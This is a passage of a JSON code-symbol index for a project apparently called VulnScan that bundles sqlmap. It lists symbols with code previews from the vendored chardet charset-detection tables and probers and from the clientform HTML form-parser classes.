MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START #28-2f\n)\n# To be accurate, the length of class 6 can be either 2 or 4.\n# But it is not necessary to discriminate between the two since",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "GB2312_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "GB2312_CHAR_LEN_TABLE = (0, 1, 1, 1, 1, 1, 2)\nGB2312_SM_MODEL = {'class_table': GB2312_CLS,\n                   'class_factor': 7,\n                   'state_table': GB2312_ST,\n                   'char_len_table': GB2312_CHAR_LEN_TABLE,\n                   'name': 'GB2312'}\n# Shift_JIS\nSJIS_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "GB2312_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "GB2312_SM_MODEL = {'class_table': GB2312_CLS,\n                   'class_factor': 7,\n                   'state_table': GB2312_ST,\n                   'char_len_table': GB2312_CHAR_LEN_TABLE,\n                   'name': 'GB2312'}\n# Shift_JIS\nSJIS_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "SJIS_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "SJIS_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17\n    1,1,1,0,1,1,1,1,  # 18 - 1f\n    1,1,1,1,1,1,1,1,  # 20 - 27\n    1,1,1,1,1,1,1,1,  # 28 - 2f\n    1,1,1,1,1,1,1,1,  # 30 - 37\n    1,1,1,1,1,1,1,1,  # 38 - 3f\n    2,2,2,2,2,2,2,2,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "SJIS_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "SJIS_ST = (\n    MachineState.ERROR,MachineState.START,MachineState.START,     3,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#00-07\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START #10-17\n)\nSJIS_CHAR_LEN_TABLE = (0, 1, 1, 2, 0, 0)\nSJIS_SM_MODEL = {'class_table': SJIS_CLS,\n               'class_factor': 6,\n               'state_table': SJIS_ST,\n               'char_len_table': SJIS_CHAR_LEN_TABLE,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "SJIS_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "SJIS_CHAR_LEN_TABLE = (0, 1, 1, 2, 0, 0)\nSJIS_SM_MODEL = {'class_table': SJIS_CLS,\n               'class_factor': 6,\n               'state_table': SJIS_ST,\n               'char_len_table': SJIS_CHAR_LEN_TABLE,\n               'name': 'Shift_JIS'}\n# UCS2-BE\nUCS2BE_CLS = (\n    0,0,0,0,0,0,0,0,  # 00 - 07\n    0,0,1,0,0,2,0,0,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "SJIS_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "SJIS_SM_MODEL = {'class_table': SJIS_CLS,\n               'class_factor': 6,\n               'state_table': SJIS_ST,\n               'char_len_table': SJIS_CHAR_LEN_TABLE,\n               'name': 'Shift_JIS'}\n# UCS2-BE\nUCS2BE_CLS = (\n    0,0,0,0,0,0,0,0,  # 00 - 07\n    0,0,1,0,0,2,0,0,  # 08 - 0f\n    0,0,0,0,0,0,0,0,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UCS2BE_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UCS2BE_CLS = (\n    0,0,0,0,0,0,0,0,  # 00 - 07\n    0,0,1,0,0,2,0,0,  # 08 - 0f\n    0,0,0,0,0,0,0,0,  # 10 - 17\n    0,0,0,3,0,0,0,0,  # 18 - 1f\n    0,0,0,0,0,0,0,0,  # 20 - 27\n    0,3,3,3,3,3,0,0,  # 28 - 2f\n    0,0,0,0,0,0,0,0,  # 30 - 37\n    0,0,0,0,0,0,0,0,  # 38 - 3f\n    0,0,0,0,0,0,0,0,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UCS2BE_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UCS2BE_CHAR_LEN_TABLE = (2, 2, 2, 0, 2, 2)\nUCS2BE_SM_MODEL = {'class_table': UCS2BE_CLS,\n                   'class_factor': 6,\n                   'state_table': UCS2BE_ST,\n                   'char_len_table': UCS2BE_CHAR_LEN_TABLE,\n                   'name': 'UTF-16BE'}\n# UCS2-LE\nUCS2LE_CLS = (\n    0,0,0,0,0,0,0,0,  # 00 - 07\n    0,0,1,0,0,2,0,0,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UCS2BE_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UCS2BE_SM_MODEL = {'class_table': UCS2BE_CLS,\n                   'class_factor': 6,\n                   'state_table': UCS2BE_ST,\n                   'char_len_table': UCS2BE_CHAR_LEN_TABLE,\n                   'name': 'UTF-16BE'}\n# UCS2-LE\nUCS2LE_CLS = (\n    0,0,0,0,0,0,0,0,  # 00 - 07\n    0,0,1,0,0,2,0,0,  # 08 - 0f\n    0,0,0,0,0,0,0,0,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UCS2LE_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UCS2LE_CLS = (\n    0,0,0,0,0,0,0,0,  # 00 - 07\n    0,0,1,0,0,2,0,0,  # 08 - 0f\n    0,0,0,0,0,0,0,0,  # 10 - 17\n    0,0,0,3,0,0,0,0,  # 18 - 1f\n    0,0,0,0,0,0,0,0,  # 20 - 27\n    0,3,3,3,3,3,0,0,  # 28 - 2f\n    0,0,0,0,0,0,0,0,  # 30 - 37\n    0,0,0,0,0,0,0,0,  # 38 - 3f\n    0,0,0,0,0,0,0,0,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UCS2LE_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UCS2LE_ST = (\n          6,     6,     7,     6,     4,     3,MachineState.ERROR,MachineState.ERROR,#00-07\n     MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n     MachineState.ITS_ME,MachineState.ITS_ME,     5,     5,     5,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,#10-17\n          5,     5,     5,MachineState.ERROR,     5,MachineState.ERROR,     6,     6,#18-1f\n          7,     6,     8,     8,     5,     5,     5,MachineState.ERROR,#20-27\n          5,     5,     5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     5,     5,#28-2f\n          5,     5,     5,MachineState.ERROR,     5,MachineState.ERROR,MachineState.START,MachineState.START #30-37\n)\nUCS2LE_CHAR_LEN_TABLE = (2, 2, 2, 2, 2, 2)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UCS2LE_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UCS2LE_CHAR_LEN_TABLE = (2, 2, 2, 2, 2, 2)\nUCS2LE_SM_MODEL = {'class_table': UCS2LE_CLS,\n                 'class_factor': 6,\n                 'state_table': UCS2LE_ST,\n                 'char_len_table': UCS2LE_CHAR_LEN_TABLE,\n                 'name': 'UTF-16LE'}\n# UTF-8\nUTF8_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07  #allow 0x00 as a legal value\n    1,1,1,1,1,1,0,0,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UCS2LE_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UCS2LE_SM_MODEL = {'class_table': UCS2LE_CLS,\n                 'class_factor': 6,\n                 'state_table': UCS2LE_ST,\n                 'char_len_table': UCS2LE_CHAR_LEN_TABLE,\n                 'name': 'UTF-16LE'}\n# UTF-8\nUTF8_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07  #allow 0x00 as a legal value\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UTF8_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UTF8_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07  #allow 0x00 as a legal value\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17\n    1,1,1,0,1,1,1,1,  # 18 - 1f\n    1,1,1,1,1,1,1,1,  # 20 - 27\n    1,1,1,1,1,1,1,1,  # 28 - 2f\n    1,1,1,1,1,1,1,1,  # 30 - 37\n    1,1,1,1,1,1,1,1,  # 38 - 3f\n    1,1,1,1,1,1,1,1,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UTF8_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UTF8_ST = (\n    MachineState.ERROR,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     12,   10,#00-07\n         9,     11,     8,     7,     6,     5,     4,    3,#08-0f\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#10-17\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#18-1f\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#20-27\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#28-2f\n    MachineState.ERROR,MachineState.ERROR,     5,     5,     5,     5,MachineState.ERROR,MachineState.ERROR,#30-37\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#38-3f\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     5,     5,     5,MachineState.ERROR,MachineState.ERROR,#40-47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UTF8_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UTF8_CHAR_LEN_TABLE = (0, 1, 0, 0, 0, 0, 2, 3, 3, 3, 4, 4, 5, 5, 6, 6)\nUTF8_SM_MODEL = {'class_table': UTF8_CLS,\n                 'class_factor': 16,\n                 'state_table': UTF8_ST,\n                 'char_len_table': UTF8_CHAR_LEN_TABLE,\n                 'name': 'UTF-8'}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "UTF8_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "peekOfCode": "UTF8_SM_MODEL = {'class_table': UTF8_CLS,\n                 'class_factor': 16,\n                 'state_table': UTF8_ST,\n                 'char_len_table': UTF8_CHAR_LEN_TABLE,\n                 'name': 'UTF-8'}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.mbcssm",
        "documentation": {}
    },
    {
        "label": "SingleByteCharSetProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.sbcharsetprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.sbcharsetprober",
        "peekOfCode": "class SingleByteCharSetProber(CharSetProber):\n    SAMPLE_SIZE = 64\n    SB_ENOUGH_REL_THRESHOLD = 1024  #  0.25 * SAMPLE_SIZE^2\n    POSITIVE_SHORTCUT_THRESHOLD = 0.95\n    NEGATIVE_SHORTCUT_THRESHOLD = 0.05\n    def __init__(self, model, reversed=False, name_prober=None):\n        super(SingleByteCharSetProber, self).__init__()\n        self._model = model\n        # TRUE if we need to reverse every pair in the model lookup\n        self._reversed = reversed",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.sbcharsetprober",
        "documentation": {}
    },
    {
        "label": "SBCSGroupProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.sbcsgroupprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.sbcsgroupprober",
        "peekOfCode": "class SBCSGroupProber(CharSetGroupProber):\n    def __init__(self):\n        super(SBCSGroupProber, self).__init__()\n        self.probers = [\n            SingleByteCharSetProber(Win1251CyrillicModel),\n            SingleByteCharSetProber(Koi8rModel),\n            SingleByteCharSetProber(Latin5CyrillicModel),\n            SingleByteCharSetProber(MacCyrillicModel),\n            SingleByteCharSetProber(Ibm866Model),\n            SingleByteCharSetProber(Ibm855Model),",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.sbcsgroupprober",
        "documentation": {}
    },
    {
        "label": "SJISProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.sjisprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.sjisprober",
        "peekOfCode": "class SJISProber(MultiByteCharSetProber):\n    def __init__(self):\n        super(SJISProber, self).__init__()\n        self.coding_sm = CodingStateMachine(SJIS_SM_MODEL)\n        self.distribution_analyzer = SJISDistributionAnalysis()\n        self.context_analyzer = SJISContextAnalysis()\n        self.reset()\n    def reset(self):\n        super(SJISProber, self).reset()\n        self.context_analyzer.reset()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.sjisprober",
        "documentation": {}
    },
    {
        "label": {
            "name": "",
            "kind": 6,
            "peekOfCode": "class a user of ``chardet`` should use.\n:author: Mark Pilgrim (initial port to Python)\n:author: Shy Shalom (original C code)\n:author: Dan Blanchard (major refactoring for 3.0)\n:author: Ian Cordasco\n\"\"\"\nimport codecs\nimport logging\nimport re\nfrom .charsetgroupprober import CharSetGroupProber"
        },
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.universaldetector",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.universaldetector",
        "peekOfCode": "class a user of ``chardet`` should use.\n:author: Mark Pilgrim (initial port to Python)\n:author: Shy Shalom (original C code)\n:author: Dan Blanchard (major refactoring for 3.0)\n:author: Ian Cordasco\n\"\"\"\nimport codecs\nimport logging\nimport re\nfrom .charsetgroupprober import CharSetGroupProber",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.universaldetector",
        "documentation": {}
    },
    {
        "label": "UniversalDetector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.universaldetector",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.universaldetector",
        "peekOfCode": "class UniversalDetector(object):\n    \"\"\"\n    The ``UniversalDetector`` class underlies the ``chardet.detect`` function\n    and coordinates all of the different charset probers.\n    To get a ``dict`` containing an encoding and its confidence, you can simply\n    run:\n    .. code::\n            u = UniversalDetector()\n            u.feed(some_bytes)\n            u.close()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.universaldetector",
        "documentation": {}
    },
    {
        "label": "UTF8Prober",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.utf8prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.utf8prober",
        "peekOfCode": "class UTF8Prober(CharSetProber):\n    ONE_CHAR_PROB = 0.5\n    def __init__(self):\n        super(UTF8Prober, self).__init__()\n        self.coding_sm = CodingStateMachine(UTF8_SM_MODEL)\n        self._num_mb_chars = None\n        self.reset()\n    def reset(self):\n        super(UTF8Prober, self).reset()\n        self.coding_sm.reset()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.utf8prober",
        "documentation": {}
    },
    {
        "label": "__version__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.version",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.version",
        "peekOfCode": "__version__ = \"3.0.4\"\nVERSION = __version__.split('.')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.version",
        "documentation": {}
    },
    {
        "label": "VERSION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.version",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.version",
        "peekOfCode": "VERSION = __version__.split('.')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.version",
        "documentation": {}
    },
    {
        "label": "Missing",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class Missing: pass\n_compress_re = re.compile(r\"\\s+\")\ndef compress_text(text): return _compress_re.sub(\" \", text.strip())\ndef normalize_line_endings(text):\n    return re.sub(r\"(?:(?<!\\r)\\n)|(?:\\r(?!\\n))\", \"\\r\\n\", text)\ndef _quote_plus(value):\n    if not isinstance(value, six.string_types):\n        value = six.text_type(value)\n    if isinstance(value, six.text_type):\n        value = value.encode(\"utf8\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "MimeWriter",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class MimeWriter:\n    \"\"\"Generic MIME writer.\n    Methods:\n    __init__()\n    addheader()\n    flushheaders()\n    startbody()\n    startmultipartbody()\n    nextpart()\n    lastpart()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "LocateError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class LocateError(ValueError): pass\nclass AmbiguityError(LocateError): pass\nclass ControlNotFoundError(LocateError): pass\nclass ItemNotFoundError(LocateError): pass\nclass ItemCountError(ValueError): pass\n# for backwards compatibility, ParseError derives from exceptions that were\n# raised by versions of ClientForm <= 0.2.5\nif HAVE_MODULE_HTMLPARSER:\n    SGMLLIB_PARSEERROR = sgmllib.SGMLParseError\n    class ParseError(sgmllib.SGMLParseError,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "AmbiguityError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class AmbiguityError(LocateError): pass\nclass ControlNotFoundError(LocateError): pass\nclass ItemNotFoundError(LocateError): pass\nclass ItemCountError(ValueError): pass\n# for backwards compatibility, ParseError derives from exceptions that were\n# raised by versions of ClientForm <= 0.2.5\nif HAVE_MODULE_HTMLPARSER:\n    SGMLLIB_PARSEERROR = sgmllib.SGMLParseError\n    class ParseError(sgmllib.SGMLParseError,\n                     HTMLParser.HTMLParseError,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ControlNotFoundError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class ControlNotFoundError(LocateError): pass\nclass ItemNotFoundError(LocateError): pass\nclass ItemCountError(ValueError): pass\n# for backwards compatibility, ParseError derives from exceptions that were\n# raised by versions of ClientForm <= 0.2.5\nif HAVE_MODULE_HTMLPARSER:\n    SGMLLIB_PARSEERROR = sgmllib.SGMLParseError\n    class ParseError(sgmllib.SGMLParseError,\n                     HTMLParser.HTMLParseError,\n                     ):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ItemNotFoundError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class ItemNotFoundError(LocateError): pass\nclass ItemCountError(ValueError): pass\n# for backwards compatibility, ParseError derives from exceptions that were\n# raised by versions of ClientForm <= 0.2.5\nif HAVE_MODULE_HTMLPARSER:\n    SGMLLIB_PARSEERROR = sgmllib.SGMLParseError\n    class ParseError(sgmllib.SGMLParseError,\n                     HTMLParser.HTMLParseError,\n                     ):\n        pass",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ItemCountError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class ItemCountError(ValueError): pass\n# for backwards compatibility, ParseError derives from exceptions that were\n# raised by versions of ClientForm <= 0.2.5\nif HAVE_MODULE_HTMLPARSER:\n    SGMLLIB_PARSEERROR = sgmllib.SGMLParseError\n    class ParseError(sgmllib.SGMLParseError,\n                     HTMLParser.HTMLParseError,\n                     ):\n        pass\nelse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "_AbstractFormParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class _AbstractFormParser:\n    \"\"\"forms attribute contains HTMLForm instances on completion.\"\"\"\n    # thanks to Moshe Zadka for an example of sgmllib/htmllib usage\n    def __init__(self, entitydefs=None, encoding=DEFAULT_ENCODING):\n        if entitydefs is None:\n            entitydefs = get_entitydefs()\n        self._entitydefs = entitydefs\n        self._encoding = encoding\n        self.base = None\n        self.forms = []",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "_AbstractSgmllibParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class _AbstractSgmllibParser(_AbstractFormParser):\n    def do_option(self, attrs):\n        _AbstractFormParser._start_option(self, attrs)\n    if sys.version_info[:2] >= (2,5):\n        # we override this attr to decode hex charrefs\n        entity_or_charref = re.compile(\n            '&(?:([a-zA-Z][-.a-zA-Z0-9]*)|#(x?[0-9a-fA-F]+))(;?)')\n        def convert_entityref(self, name):\n            return unescape(\"&%s;\" % name, self._entitydefs, self._encoding)\n        def convert_charref(self, name):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "FormParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class FormParser(_AbstractSgmllibParser, sgmllib.SGMLParser):\n    \"\"\"Good for tolerance of incorrect HTML, bad for XHTML.\"\"\"\n    def __init__(self, entitydefs=None, encoding=DEFAULT_ENCODING):\n        sgmllib.SGMLParser.__init__(self)\n        _AbstractFormParser.__init__(self, entitydefs, encoding)\n    def feed(self, data):\n        try:\n            sgmllib.SGMLParser.feed(self, data)\n        except SGMLLIB_PARSEERROR as exc:\n            raise ParseError(exc)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "Label",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class Label:\n    def __init__(self, attrs):\n        self.id = attrs.get(\"for\")\n        self._text = attrs.get(\"__text\").strip()\n        self._ctext = compress_text(self._text)\n        self.attrs = attrs\n        self._backwards_compat = False  # maintained by HTMLForm\n    def __getattr__(self, name):\n        if name == \"text\":\n            if self._backwards_compat:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "Control",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class Control:\n    \"\"\"An HTML form control.\n    An HTMLForm contains a sequence of Controls.  The Controls in an HTMLForm\n    are accessed using the HTMLForm.find_control method or the\n    HTMLForm.controls attribute.\n    Control instances are usually constructed using the ParseFile /\n    ParseResponse functions.  If you use those functions, you can ignore the\n    rest of this paragraph.  A Control is only properly initialised after the\n    fixup method has been called.  In fact, this is only strictly necessary for\n    ListControl instances.  This is necessary because ListControls are built up",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "ScalarControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "peekOfCode": "class ScalarControl(Control):\n    \"\"\"Control whose value is not restricted to one of a prescribed set.\n    Some ScalarControls don't accept any value attribute.  Otherwise, takes a\n    single value, which must be string-like.\n    Additional read-only public attribute:\n    attrs: dictionary mapping the names of original HTML attributes of the\n     control to their values\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        self._index = index",
        "detail": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "documentation": {}
    },
    {
        "label": "TextControl",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
        "description": "VulnScan.modules.sqlmap.thirdparty.clientform.clientform",
